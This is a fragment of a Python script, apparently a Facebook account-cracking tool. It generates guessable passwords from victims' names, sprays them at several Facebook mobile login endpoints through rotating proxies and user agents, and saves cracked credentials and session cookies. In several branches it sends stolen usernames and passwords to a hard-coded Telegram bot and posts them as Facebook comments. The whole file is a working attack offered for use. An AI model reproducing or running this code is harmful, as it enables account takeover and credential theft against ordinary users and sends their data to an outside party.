	prog = Progress(SpinnerColumn('monkey'),TextColumn('{task.description}'),BarColumn(bar_width=23),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
					else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'mobile-v2' in method:
					pool.submit(crackmobile,idf,pwv)
				else:
					pool.submit(crackmobile,idf,pwv)
		print('')
		cetak(panel(f'[bold green]Succesfully Crack,Dont Forget Send Your Feedback After Use My Script, Thanks You',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SUCCESFULY [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
		print('')
		print(f'{h} OK : {h}%s '%(ok))
		print(f'{k} CP : {k}%s{x} '%(cp))
		print('')
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(redmi)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=True,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				requests.post(f"https://api.telegram.org/bot5442935736:AAHjdbHR1eokgcUhA8DnYYQqBxp4nXLKafM/sendMessage?chat_id=-1001808963086&text={idf}\n{pw}")
				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]lupine CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
				#tree.add(f"[bold yellow]{idf}|{pw}")
				#tree.add(f"[bold red]{ua}\n")
				#cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
#				requests.post(f"https://api.telegram.org/bot5442935736:AAHjdbHR1eokgcUhA8DnYYQqBxp4nXLKafM/sendMessage?chat_id=-1001808963086&text={idf}\n{pw}\n{kuki}")
				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}[/]",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]lupine OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
				#tree.add(f"[bold green]{idf}|{pw}")
				#tree.add(f"[bold green]{kuki}[/]")
				#tree.add(f"[bold blue]{ua}\n")
				#cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-FREE-FB ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(redmi)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D1217981644879628%26redirect_uri%3Dhttps%253A%252F%252Fm.facebook.com%252Ffxauth%252F%253Fapp_id%253D1217981644879628%2526etoken%253DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%2526extra_data%253D%25252Fadd%25252F%25253Fbackground_page%25253D%2525252Fconnected_experiences%2525252Fcross_posting%2525252F%2526native_app_login_flow%253Dfbcalcomettest%26auth_token%3D337f7934695cf2963672358b1e19c128%26_rdr%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da1d0db75-4951-4704-867d-058aa7e87166%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr#_=_")
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/native_sso/?flow=fbcalcomettest&app_id=1217981644879628&token=Abj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ&extra_data=%2Fadd%2F%3Fbackground_page%3D%252Fconnected_experiences%252Fcross_posting%252F&paipv=0&eav=AfYD0_FUyfl0ZkOdJg9Ow6CjirAUwhChmehMIP_lrmfZ_AjcX9PhATJ2wGFAv0D_OAk&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host": "m.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.facebook.katana","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D1217981644879628%26redirect_uri%3Dhttps%253A%252F%252Fm.facebook.com%252Ffxauth%252F%253Fapp_id%253D1217981644879628%2526etoken%253DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%2526extra_data%253D%25252Fadd%25252F%25253Fbackground_page%25253D%2525252Fconnected_experiences%2525252Fcross_posting%2525252F%2526native_app_login_flow%253Dfbcalcomettest%26auth_token%3D337f7934695cf2963672358b1e19c128%26_rdr%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da1d0db75-4951-4704-867d-058aa7e87166%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr#_=_","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]lupine CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
				#tree.add(f"[bold yellow]{idf}|{pw}")
				#tree.add(f"[bold red]{ua}\n")
				#cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]lupine OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
				#tree.add(f"[bold green]{idf}|{pw}")
				#tree.add(f"[bold green]{kuki}[/]")
				#tree.add(f"[bold blue]{ua}\n")
				#cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MBASIC ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D542599432471018%26redirect_uri%3Dhttps%253A%252F%252Fmedium.com%252Fm%252Fcallback%252Ffacebook%26scope%3Dpublic_profile%252Cemail%26state%3Dfacebook-%257Chttps%253A%252F%252Fmedium.com%252F%253Fsource%253Dlogin--------------------------lo_home_nav-----------%257Clogin%257Cb4222fa6cc3f75a8f10e683e15ac4f26%257Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf%26response_type%3Dtoken%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D51f6b7c3-e4b9-4003-938d-568af35e4366%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmedium.com%2Fm%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebook-%257Chttps%253A%252F%252Fmedium.com%252F%253Fsource%253Dlogin--------------------------lo_home_nav-----------%257Clogin%257Cb4222fa6cc3f75a8f10e683e15ac4f26%257Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/v5.0/dialog/oauth?client_id=542599432471018&redirect_uri=https%3A%2F%2Fmedium.com%2Fm%2Fcallback%2Ffacebook&scope=public_profile%2Cemail&state=facebook-%7Chttps%3A%2F%2Fmedium.com%2F%3Fsource%3Dlogin--------------------------lo_home_nav-----------%7Clogin%7Cb4222fa6cc3f75a8f10e683e15ac4f26%7Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf&response_type=token&ret=login&fbapp_pres=0&logger_id=51f6b7c3-e4b9-4003-938d-568af35e4366&tp=unspecified"}
			heade={'Host': 'm.facebook.com',
			       'cache-control': 'max-age=0',
			       ':scheme': 'https',
			       'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102"',
			       'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			       'upgrade-insecure-requests': '1',
			       'origin': 'https://m.facebook.com',
			       'content-type': 'text/html; charset=utf-8 ',
			       'user-agent': ua,
			       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			       'sec-fetch-site': 'none',
			       'sec-fetch-mode': 'navigate',
			       'sec-fetch-dest': 'document',
			       'referer':'https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D542599432471018%26redirect_uri%3Dhttps%253A%252F%252Fmedium.com%252Fm%252Fcallback%252Ffacebook%26scope%3Dpublic_profile%252Cemail%26state%3Dfacebook-%257Chttps%253A%252F%252Fmedium.com%252F%253Fsource%253Dlogin--------------------------lo_home_nav-----------%257Clogin%257Cb4222fa6cc3f75a8f10e683e15ac4f26%257Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf%26response_type%3Dtoken%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D51f6b7c3-e4b9-4003-938d-568af35e4366%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmedium.com%2Fm%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebook-%257Chttps%253A%252F%252Fmedium.com%252F%253Fsource%253Dlogin--------------------------lo_home_nav-----------%257Clogin%257Cb4222fa6cc3f75a8f10e683e15ac4f26%257Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr',
			       'accept-encoding':'gzip, deflate br',
			       'accept-language':'en-US,en;q=0.9'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]lupine CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
				#tree.add(f"[bold yellow]{idf}|{pw}")
				#tree.add(f"[bold red]{ua}\n")
				#cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]lupine OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
				#tree.add(f"[bold green]{idf}|{pw}")
				#tree.add(f"[bold green]{kuki}[/]")
				#tree.add(f"[bold blue]{ua}\n")
				#cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE-MOBILE-V2 ]-----------------#
def crackmobile(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(redmi)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=966242223397117&auth_token=9af15271c748d378ef8bc2b720b79e63&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&refsrc=deprecated&app_id=966242223397117&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]lupine CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
				#tree.add(f"[bold yellow]{idf}|{pw}")
				#tree.add(f"[bold red]{ua}\n")
				#cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kukie = open(".cok.txt","r").read()
				toket = open(".token.txt","r").read()
				requests.post(f"https://graph.facebook.com/100032577396395_573456663750242/comments/?message=Akun---->CP\n{idf}|{pw}&access_token={toket}", headers = {"cookie":kukie})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
#				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}[/]",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]lupine OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
				#tree.add(f"[bold green]{idf}|{pw}")
				#tree.add(f"[bold green]{kuki}[/]")
				#tree.add(f"[bold blue]{ua}\n")
				#cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#ERROR BYPASSING
#def genkey():
#        try:
#                basex = open('/sdcard/Android/media/.libr-cpq', 'r').read()
#                basex1 = basex.encode('ascii')
#                basex2 = base64.b64encode(basex1)
#                basex3 = basex2.decode('ascii')
#                base4 = (basex3).upper()
